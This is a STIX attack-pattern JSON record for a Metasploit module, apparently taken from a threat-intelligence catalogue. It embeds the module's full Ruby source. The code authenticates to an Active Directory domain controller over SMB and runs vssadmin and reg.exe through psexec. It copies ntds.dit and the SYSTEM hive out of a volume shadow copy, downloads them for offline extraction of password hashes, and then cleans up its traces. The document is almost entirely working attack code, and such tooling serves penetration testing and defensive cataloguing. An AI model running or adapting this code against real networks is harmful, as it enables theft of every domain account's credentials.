{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c7ea3dac-8a14-4de9-a64c-f31afac0eb67",
    "created": "2024-08-14T16:24:23.757452Z",
    "modified": "2024-08-14T16:24:23.757456Z",
    "name": "PsExec NTDS.dit And SYSTEM Hive Download Utility",
    "description": " This module authenticates to an Active Directory Domain Controller and creates a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the ntds.dit file as well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM hive copy can be used in combination with other tools for offline extraction of AD password hashes. All of this is done without uploading a single binary to the target host. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/smb/psexec_ntdsgrab.rb",
            "external_id": "psexec_ntdsgrab.rb"
        },
        {
            "source_name": "reference",
            "url": "http://sourceforge.net/projects/smbexec"
        },
        {
            "source_name": "reference",
            "url": "https://www.optiv.com/blog/owning-computers-without-shell-access"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client::Psexec\n  include Msf::Auxiliary::Report\n\n  # Aliases for common classes\n  SIMPLE = Rex::Proto::SMB::SimpleClient\n  XCEPT= Rex::Proto::SMB::Exceptions\n  CONST= Rex::Proto::SMB::Constants\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'PsExec NTDS.dit And SYSTEM Hive Download Utility',\n      'Description'=> %q{\n          This module authenticates to an Active Directory Domain Controller and creates\n        a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the\n        ntds.dit file as well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM\n        hive copy can be used in combination with other tools for offline extraction of AD\n        password hashes. All of this is done without uploading a single binary to the\n        target host.\n      },\n      'Author' => [\n        'Royce Davis <rdavis[at]accuvant.com>' # @R3dy__\n      ],\n      'License'=> MSF_LICENSE,\n      'References' => [\n        [ 'URL', 'http://sourceforge.net/projects/smbexec' ],\n        [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ]\n      ]\n    ))\n\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),\n      OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),\n      OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),\n      OptBool.new('CREATE_NEW_VSC', [false, 'If true, attempts to create a volume shadow copy', false]),\n    ])\n\n  end\n\n  # This is the main control method\n  def run\n    # Initialize some variables\n    text = \"\\\\#{datastore['WINPATH']}\\\\Temp\\\\#{Rex::Text.rand_text_alpha(16)}.txt\"\n    bat = \"\\\\#{datastore['WINPATH']}\\\\Temp\\\\#{Rex::Text.rand_text_alpha(16)}.bat\"\n    createvsc = \"vssadmin create shadow /For=%SYSTEMDRIVE%\"\n    @ip = datastore['RHOST']\n    @smbshare = datastore['SMBSHARE']\n    # Try and connect\n    if connect\n      # Try and authenticate with given credentials\n      begin\n        smb_login\n      rescue StandardError => autherror\n        print_error(\"Unable to authenticate with given credentials: #{autherror}\")\n        return\n      end\n      # If a VSC was specified then don't try and create one\n      if datastore['VSCPATH'].length > 0\n        print_status(\"Attempting to copy NTDS.dit from #{datastore['VSCPATH']}\")\n        vscpath = datastore['VSCPATH']\n      else\n        unless datastore['CREATE_NEW_VSC']\n          vscpath = check_vss(text, bat)\n        end\n        unless vscpath\n          vscpath = make_volume_shadow_copy(createvsc, text, bat)\n        end\n      end\n      if vscpath\n        if copy_ntds(vscpath, text) and copy_sys_hive\n          download_ntds((datastore['WINPATH'] + \"\\\\Temp\\\\ntds\"))\n          download_sys_hive((datastore['WINPATH'] + \"\\\\Temp\\\\sys\"))\n        else\n          print_error(\"Failed to find a volume shadow copy.  Issuing cleanup command sequence.\")\n        end\n      end\n      cleanup_after(bat, text, \"\\\\#{datastore['WINPATH']}\\\\Temp\\\\ntds\", \"\\\\#{datastore['WINPATH']}\\\\Temp\\\\sys\")\n      disconnect\n    end\n  end\n\n\n  # Thids method will check if a Volume Shadow Copy already exists and use that rather\n  # then creating a new one\n  def check_vss(text, bat)\n    begin\n      print_status(\"Checking if a Volume Shadow Copy exists already.\")\n      prepath = '\\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy'\n      command = \"%COMSPEC% /C echo vssadmin list shadows ^> #{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}\"\n      result = psexec(command)\n      data = smb_read_file(datastore['SMBSHARE'], @ip, text)\n      vscs = []\n      data.each_line { |line| vscs << line if line.include?(\"GLOBALROOT\") }\n      if vscs.empty?\n        print_status(\"No VSC Found.\")\n        return nil\n      end\n      vscpath = prepath + vscs[vscs.length - 1].to_s.split(\"ShadowCopy\")[1].to_s.chomp\n      print_good(\"Volume Shadow Copy exists on #{vscpath}\")\n      return vscpath\n    rescue StandardError => vsscheckerror\n      print_error(\"Unable to determine if VSS is enabled: #{vsscheckerror}\")\n      return nil\n    end\n  end\n\n\n  # Create a Volume Shadow Copy on the target host\n  def make_volume_shadow_copy(createvsc, text, bat)\n    begin\n      #Try to create the shadow copy\n      command = \"%COMSPEC% /C echo #{createvsc} ^> #{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}\"\n      print_status(\"Creating Volume Shadow Copy\")\n      out = psexec(command)\n      #Get path to Volume Shadow Copy\n      vscpath = get_vscpath(text)\n    rescue StandardError => vscerror\n      print_error(\"Unable to create the Volume Shadow Copy: #{vscerror}\")\n      return nil\n    end\n    if vscpath\n      print_good(\"Volume Shadow Copy created on #{vscpath}\")\n      return vscpath\n    else\n      return nil\n    end\n  end\n\n\n  # Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host\n  def copy_ntds(vscpath, text)\n    begin\n      ntdspath = vscpath.to_s + \"\\\\\" + datastore['WINPATH'] + \"\\\\NTDS\\\\ntds.dit\"\n      command = \"%COMSPEC% /C copy /Y \\\"#{ntdspath}\\\" %WINDIR%\\\\Temp\\\\ntds\"\n      run = psexec(command)\n      if !check_ntds(text)\n        return false\n      end\n      return true\n    rescue StandardError => ntdscopyerror\n      print_error(\"Unable to copy ntds.dit from Volume Shadow Copy.Make sure target is a Windows Domain Controller: #{ntdscopyerror}\")\n      return false\n    end\n  end\n\n\n  # Checks if ntds.dit was copied to the Windows Temp directory\n  def check_ntds(text)\n    print_status(\"Checking if NTDS.dit was copied.\")\n    check = \"%COMSPEC% /C dir \\\\#{datastore['WINPATH']}\\\\Temp\\\\ntds > #{text}\"\n    run = psexec(check)\n    output = smb_read_file(@smbshare, @ip, text)\n    if output.include?(\"ntds\")\n      return true\n    end\n    return false\n  end\n\n\n  # Copies the SYSTEM hive file to the Temp directory on the target host\n  def copy_sys_hive\n    begin\n      # Try to crate the sys hive copy\n      command = \"%COMSPEC% /C reg.exe save HKLM\\\\SYSTEM %WINDIR%\\\\Temp\\\\sys /y\"\n      return psexec(command)\n    rescue StandardError => hiveerror\n      print_error(\"Unable to copy the SYSTEM hive file: #{hiveerror}\")\n      return false\n    end\n  end\n\n\n  # Download the ntds.dit copy to your attacking machine\n  def download_ntds(file)\n    print_status(\"Downloading ntds.dit file\")\n    begin\n      # Try to download ntds.dit\n      simple.connect(\"\\\\\\\\#{@ip}\\\\#{@smbshare}\")\n      remotefile = simple.open(\"#{file}\", 'rob')\n      data = remotefile.read\n      remotefile.close\n      ntds_path = store_loot(\"psexec.ntdsgrab.ntds\", \"application/octet-stream\", @ip, data, \"ntds.dit\")\n      print_good(\"ntds.dit stored at #{ntds_path}\")\n    rescue StandardError => ntdsdownloaderror\n      print_error(\"Unable to downlaod ntds.dit: #{ntdsdownloaderror}\")\n      return ntdsdownloaderror\n    end\n    simple.disconnect(\"\\\\\\\\#{@ip}\\\\#{@smbshare}\")\n  end\n\n\n  # Download the SYSTEM hive copy to your attacking machine\n  def download_sys_hive(file)\n    print_status(\"Downloading SYSTEM hive file\")\n    begin\n      # Try to download SYSTEM hive\n      simple.connect(\"\\\\\\\\#{@ip}\\\\#{@smbshare}\")\n      remotefile = simple.open(\"#{file}\", 'rob')\n      data = remotefile.read\n      remotefile.close\n      hive_path = store_loot(\"psexec.ntdsgrab.hive\", \"application/octet-stream\", @ip, data, \"system-hive\")\n      print_good(\"SYSTEM hive stored at #{hive_path}\")\n    rescue StandardError => sysdownloaderror\n      print_error(\"Unable to download SYSTEM hive: #{sysdownloaderror}\")\n      return sysdownloaderror\n    end\n    simple.disconnect(\"\\\\\\\\#{@ip}\\\\#{@smbshare}\")\n  end\n\n\n  # Gets the path to the Volume Shadow Copy\n  def get_vscpath(file)\n    begin\n      prepath = '\\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy'\n      vsc = \"\"\n      output = smb_read_file(@smbshare, @ip, file)\n      output.each_line do |line|\n        vsc += line if line.include?(\"GLOBALROOT\")\n      end\n      return prepath + vsc.split(\"ShadowCopy\")[1].chomp\n    rescue StandardError => vscpath_error\n      print_error(\"Could not determine the exact path to the VSC check your WINPATH\")\n      return nil\n    end\n  end\n\n  # Removes files created during execution.\n  def cleanup_after(*files)\n    simple.connect(\"\\\\\\\\#{@ip}\\\\#{@smbshare}\")\n    print_status(\"Executing cleanup...\")\n    files.each do |file|\n      begin\n        if smb_file_exist?(file)\n          smb_file_rm(file)\n        end\n      rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror\n        print_error(\"Unable to cleanup #{file}. Error: #{cleanuperror}\")\n      end\n    end\n    left = files.collect{ |f| smb_file_exist?(f) }\n    if left.any?\n      print_error(\"Unable to cleanup. Maybe you'll need to manually remove #{left.join(\", \")} from the target.\")\n    else\n      print_good(\"Cleanup was successful\")\n    end\n    simple.disconnect(\"\\\\\\\\#{@ip}\\\\#{@smbshare}\")\n  end\nend\n"
}